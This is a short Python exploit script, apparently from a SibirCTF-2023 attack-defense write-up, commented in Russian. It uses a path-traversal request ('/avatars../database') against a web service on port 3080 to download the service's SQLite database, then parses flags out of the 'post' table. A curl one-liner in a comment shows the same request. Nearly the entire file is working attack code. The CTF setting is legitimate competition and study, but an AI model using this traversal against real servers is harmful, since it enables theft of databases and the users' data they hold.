import requests
import sqlite3


# URL, URI, IP
ip = "127.0.0.1"
url = f"http://{ip}:3080"
file_path = '/avatars../database'


# Функция для скачивания БД
'''
curl -X "GET" "http://localhost:3080/avatars../database" --output -
'''
def download_db(url, file_path, ip):
	# Реализуем запрос к файлу с БД
	resp = requests.get(url + file_path)

	# Если запрос прошёл удачно, то записываем содержимое запроса в файл
	if resp.status_code == 200:
		with open(f"D:/Projects/Attack-Defense-CTFs-Write-Ups/SibirCTF-2023/exploits/sx/databases/{ip}", "wb") as db_file:
			db_file.write(resp.content)
		return f"\033[32m[+] Status: OK, file {ip} was saved!\033[0m"
	else:
		return f"\033[31m[-] Status: Error, the server returned this status code - {resp.status_code}!\033[0m"


# Функция для прасинга флагов из скачанной БД
def parse_db(ip):
	# Подключаемся к файлу с БД
	conn = sqlite3.connect(f"D:/Projects/Attack-Defense-CTFs-Write-Ups/SibirCTF-2023/exploits/sx/databases/{ip}")
	array_list = []
	try:
		# Реализуем запрос на получение данных из таблицы post, где должны храниться флаги
		results = conn.execute("SELECT * FROM post ORDER BY created_at DESC LIMIT 100")
		
		# Парсим флаги и заносим их в отдельных массив, который возвращаем в качестве результата работы функции
		for row in results.fetchall():
			if 'flag' in row[3]:
				res = row[3].split('flag: ')[-1]
				array_list.append(res)
		return f"\033[32m[+] Successfully parsed DB: {array_list}\033[0m"
	except Exception as err:
		return f"\033[31m[-] Error: {err}\033[0m"


# Main
if __name__ == "__main__":
	print(download_db(url, file_path, ip))
	print(parse_db(ip))